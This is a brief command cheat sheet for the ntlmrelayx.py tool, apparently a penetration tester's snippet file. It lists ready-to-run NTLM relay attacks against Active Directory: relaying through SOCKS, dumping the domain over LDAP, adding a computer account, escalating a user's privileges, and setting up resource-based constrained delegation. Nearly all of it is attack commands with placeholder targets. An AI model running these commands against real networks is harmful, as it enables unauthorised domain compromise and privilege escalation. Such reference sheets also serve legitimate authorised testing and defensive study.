# ntlmrelayx
#target/remote #os/linux #cat/ad

## Socks relay from file
```
ntlmrelayx.py -tf relay.txt -smb2support -socks
```

## Relay LDAP dump domain
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-da --no-acl --lootdir ldap_dump
```

## Relay LDAP add computer
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --add-computer <new_machine|'BEANS$'>
```

## Relay LDAP escalate user
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --escalate-user <target_obj|'BEANS$'>
```

## Relay LDAP RBCD
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --escalate-user <target_obj|'BEANS$'> --delegate-access
```
